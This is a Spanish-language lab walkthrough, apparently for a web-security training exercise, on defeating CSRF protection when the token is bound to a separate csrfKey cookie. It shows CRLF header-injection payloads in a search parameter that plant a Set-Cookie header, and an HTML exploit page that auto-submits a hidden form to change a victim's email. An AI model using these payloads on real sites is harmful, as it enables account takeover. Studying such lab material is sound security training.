Para explotarlo:

- Iniciamos sesión con un usuario y capturamos tanto el valor del **csrfKey** como el token CSRF.
- Probamos que el servidor acepta esos valores incluso cuando son usados por otro usuario, es decir, no hay una validación estricta entre token, cookie y sesión.
- Además, observamos que la funcionalidad de búsqueda refleja cabeceras **Set-Cookie**, lo que nos permite inyectar cookies arbitrarias en el navegador víctima.
- Montamos un exploit que:
    - Realiza una búsqueda maliciosa para setear la cookie csrfKey deseada.
    - Luego, una vez inyectada, envía el formulario con el token capturado, consiguiendo cambiar el email de la víctima.

Este tipo de fallo es un buen ejemplo de validaciones CSRF mal implementadas, donde la lógica del servidor es parcial o inconsistente.

El ataque se desarrolla en dos fases:

- Inyección de la cookie ‘**csrfKey**‘ en el navegador víctima mediante una URL de búsqueda que fuerza al servidor a emitir un encabezado ‘**Set-Cookie**‘ reflejado.
- Envío del formulario CSRF con el token correspondiente, haciendo uso de la cookie previamente establecida.

Gracias a esto, conseguimos alterar la dirección de correo de la víctima sin que el servidor lo detecte como una acción ilegítima.

Este escenario demuestra cómo incluso mecanismos aparentemente robustos pueden ser burlados cuando no se integran correctamente con la lógica de sesión

------

Debemos de ver que hace el campo de busqueda de la pagina principal

Probamos con lo siguiente:
* Quitar caracteres al valor del token
* Quitar todo el parametro del token
* quitar caracteres a las cookies de sesion
* Intercambiar valores del token entre usuarios
* Para el valor de busqueda, se setea un header en la cookie de sesion con el valor de la ultima busqueda

Ahora, nos damos cuenta que al hacer un busqueda, es posible inyectar caracteres, el cual nos permite hacer una inyeccion de cabeceras en cookie

    /?search=prueba; csrfKey=a
    /?search=prueba;%20csrfKey=a

Vemos que hay un problema, ya que no se setea correctamente el valor que le inyectamos, por lo que debemos de intentar hacer un salto de linea y setear la cabecera "Set-Cookie"

    /?search=prueba%0d%0aSet-Cookie:%20csrfKey=a

Con esto, es posible crear un salto de linea

Entonces nos montamos un script, para setear los valores correctos que corresponden a una peticion valida, para este caso, tomamos los 2 valores de "csrf_token" y "csrfKey"

```html
<form class="login-form" name="change-email-form" action="/my/account/change" method="POST">
    <input type="hidden" name="email" value="markos@markos.com">
    <input type="hidden" name="csrf" value="<csrf_value_valid>">
</form>

<img src="http://burpsuite.com/?searh=prueba%0d%0aSet-Cookie:%20csrfKey=<value_user>%3d%20SameSite=None" onerror="document.forms[0].submit();">

```

